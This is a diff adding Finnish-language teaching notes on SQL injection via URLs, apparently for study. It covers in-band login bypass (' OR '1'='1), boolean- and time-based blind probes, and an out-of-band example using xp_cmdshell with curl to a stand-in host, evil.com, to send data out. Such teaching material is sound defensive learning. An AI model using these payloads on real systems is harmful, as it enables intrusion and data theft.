@@ -61,4 +61,41 @@ Kolmen typpistä injektio ovat;
 
 Esim. `' AND 1=1 --` - sivu latautuu normaalisti tarkoittaa ehto 1=1. Mutta jos esim. `' AND 1=2 --` ettei sivu lataudu. Näin hän voi päätellä, että ehto 1=2 on epätosi.
 
+<hr>
 
+Muutamia esimerkkejä koskien URL-pohjaisen hyökkäystä, ja vastaavasti miten hyökkäys voi rakentua URL:in kautta. 
+
+- ESIM: URL:ssa voi olla parametrinä esimerkiksi käyttäjätunnus ja salasana, ja hyökkääjä voi yrittää manipuloida niitä.
+URL-pohjaisesta in-band SQL -injektiosta; 
+<br> `http://example.com/login.php?username=admin&password=' OR '1'='1` 
+
+Tässä URL:ssa hyökkääjä on lisännyt syötteen, joka muuttaa SQL-kyselyn käyttäen `OR '1'='1` -ehtoa. Tämä voisi johtaa siihen, että SQL-kysely palauttaa kaikki käyttäjät, koska ehto `1=1` on aina totta. Jos sovellus ei ole suojattu kunnolla, tämä voi paljastaa käyttäjätietoja tai jopa antaa pääsyn sovellukseen ilman oikeaa salasanaa.
+
+
+- ESIM: tässä hyökkäyksessä hyökkääjä ei saa suoraa palautetta samassa yhteydessä, mutta SQL-kysely voi laukaista ulkoisen tiedonsiirron hyökkääjän palvelimelle. Tämä voi tapahtua esimerkiksi komentojen ajamisella tietokannan kautta, joka lähettää pyynnön ulkoiselle palvelimelle.
+URL-pohjaisesta out-of-band SQL -injektiosta:
+<br> `http://example.com/product.php?id=1; EXEC xp_cmdshell('curl http://evil.com/data') --`
+
+Tässä URL:ssa hyökkääjä on lisännyt SQL-koodia, joka käyttää `EXEC xp_cmdshell`-komentoa, joka mahdollistaa komentojen suorittamisen tietokannan palvelimella. Tässä esimerkissä suoritetaan curl-komento, joka lähettää tiedot hyökkääjän palvelimelle. Tämä on tyypillinen tapa, jolla out-of-band SQL-injektio voi toimia — hyökkääjä ei saa suoraa vastausta kyselystä, mutta tietoja siirretään ulkopuoliseen järjestelmään.
+
+
+- ESIM: Tässä hyökkäyksessä hyökkääjä ei saa suoraa palautetta, mutta hän voi tehdä kokeiluja ja seurata sivun käyttäytymistä, jotta voi päätellä, onko tietty ehto totta vai epätotta. Yksi yleisimmistä tavoista on käyttää boolean-based tai time-based -tekniikoita.
+URL-pohjaisesta blind SQL -injektiosta (boolean-based):
+<br> `http://example.com/product.php?id=1' AND 1=1 --` 
+
+Tässä URL:ssa hyökkääjä lisää ehtoja SQL-kyselyyn. Tämä kysely palauttaa oikean sivun, koska 1=1 on aina totta. Hyökkääjä voi kokeilla myös seuraavaa:
+
+<br> `http://example.com/product.php?id=1' AND 1=2 --` 
+
+Tässä kysely palauttaa todennäköisesti tyhjän sivun, koska 1=2 on epätotta. Tämä antaa hyökkääjälle vihjeen siitä, että hän voi manipuloida tietokannan kyselyjä ja päätellä, onko jokin ehto totta vai epätotta.
+
+URL-pohjaisesta blind SQL -injektiosta (time-based):
+<br> `http://example.com/product.php?id=1' AND SLEEP(5) --`
+
+Tässä URL:ssa hyökkääjä lisää `SLEEP(5)`-komennon SQL-kyselyyn. Tämä pakottaa tietokannan odottamaan 5 sekuntia ennen kuin se palauttaa tuloksen. Hyökkääjä voi mitata, kuinka kauan sivu kestää latautuessaan. Jos sivu viivästyy, hän tietää, että SQL-kyselyssä oli SLEEP(5)-komento, ja tämä auttaa häntä arvioimaan tietokannan rakennetta ja tietoja.
+
+
+
+
+
+<hr>
